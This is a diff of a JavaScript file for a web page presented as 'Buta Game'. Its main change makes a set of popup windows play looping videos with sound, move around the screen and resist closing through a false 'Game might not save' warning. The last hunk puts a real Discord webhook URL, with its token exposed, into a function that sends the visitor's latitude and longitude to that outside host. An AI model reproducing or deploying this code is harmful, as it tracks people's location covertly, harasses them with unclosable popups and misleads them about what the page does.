@@ -1,3 +1,4 @@
+/* script.js */
 document.getElementById('playButton').addEventListener('click', function() {
     const videoFiles = [
         'videos/video1.mp4',
@@ -11,32 +12,59 @@ document.getElementById('playButton').addEventListener('click', function() {
     videoFiles.forEach((url, index) => {
         const newWindow = window.open('', `ButaGameWindow${index}`, 'width=400,height=300');
         if (newWindow) {
-            // Write the HTML content with proper video setup
-            newWindow.document.write(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Buta Game</title>
-                    <style>
-                        body { margin: 0; overflow: hidden; }
-                        video { width: 100%; height: 100%; object-fit: cover; }
-                    </style>
-                </head>
-                <body>
-                    <video id="popupVideo" autoplay loop muted>
-                        <source src="${url}" type="video/mp4">
-                        Your browser does not support the video tag.
-                    </video>
-                    <script>
-                        window.onbeforeunload = function() {
-                            return "Are you sure you want to close? Game might not save.";
-                        };
-                        // Ensure video plays
-                        document.getElementById('popupVideo').play();
-                    </script>
-                </body>
-                </html>
-            `);
+            // First video in fullscreen
+            if (index === 0) {
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Buta Game</title>
+                        <style>
+                            body { margin: 0; overflow: hidden; }
+                            video { width: 100vw; height: 100vh; object-fit: cover; }
+                        </style>
+                    </head>
+                    <body>
+                        <video id="popupVideo" autoplay loop>
+                            <source src="${url}" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                        <script>
+                            window.onbeforeunload = function() {
+                                return "Are you sure you want to close? Game might not save.";
+                            };
+                            document.getElementById('popupVideo').play();
+                        </script>
+                    </body>
+                    </html>
+                `);
+            } else {
+                // Other videos with audio
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Buta Game</title>
+                        <style>
+                            body { margin: 0; overflow: hidden; }
+                            video { width: 100%; height: 100%; object-fit: cover; }
+                        </style>
+                    </head>
+                    <body>
+                        <video id="popupVideo" autoplay loop>
+                            <source src="${url}" type="video/mp4">
+                            Your browser does not support the video tag.
+                        </video>
+                        <script>
+                            window.onbeforeunload = function() {
+                                return "Are you sure you want to close? Game might not save.";
+                            };
+                            document.getElementById('popupVideo').play();
+                        </script>
+                    </body>
+                    </html>
+                `);
+            }
             newWindow.document.close();
 
             // Move the window
@@ -60,9 +88,10 @@ document.getElementById('playButton').addEventListener('click', function() {
         }
     });
 
-    // Play fourth video on main page
+    // Play fourth video on main page with audio
     const mainVideo = document.getElementById('mainVideo');
     mainVideo.style.display = 'block';
+    mainVideo.muted = false; // Ensure audio plays on main page
     mainVideo.play();
 
     // Hide button
@@ -96,7 +125,7 @@ function sendLocationToWebhook() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const { latitude, longitude } = position.coords;
-            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+            const webhookUrl = 'https://discord.com/api/webhooks/1357338228004487341/YOjCQVGU-IMzYt_ZP9-YJjUags_DeF8eGap3JPEiTGRio98s1h8FIlcGxvuZwYyTV0H6';
             const data = {
                 content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                 username: 'ButaGameBot'
